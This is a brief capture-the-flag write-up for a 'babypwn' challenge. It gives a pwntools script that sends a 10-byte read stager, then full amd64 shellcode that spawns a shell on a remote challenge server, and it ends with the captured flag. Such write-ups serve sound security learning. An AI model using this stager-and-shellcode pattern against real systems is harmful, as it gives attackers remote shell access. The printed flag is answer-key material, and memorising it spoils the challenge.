We need to use 10 bytes shellcode to read more shellcode to buffer contained in rdx

Code we use during the challenge

```
#! /usr/bin/python
 
from pwn import *
import sys
 
def exploit():
    gdb_command = '''
        b *0x40077E
        c
    '''
    sc = asm('''
        push rdx
        pop rsi
        push 0x7f
        pop rdx
        syscall
    ''', arch='amd64')
    log.info(len(sc))
    r.sendlineafter('Give me 10 bytes:', sc)
    sc = asm(shellcraft.amd64.linux.sh(), arch='amd64')
    r.sendline('a' * 7 + sc)
    r.interactive()
 
 
if __name__ == '__main__':
    context.terminal = ['gnome-terminal', '-e']
    if len(sys.argv) == 1:
        exit()
    if sys.argv[1] == 'remote':
        r = remote('128.199.247.163', 19957)
        LOCAL = False
    elif sys.argv[1] == 'local':
        r = process('./babypwn')
        LOCAL = True
    else:
        exit()
    exploit()
```

```
flag : wgmy{w3ll_don3_m473!}
```
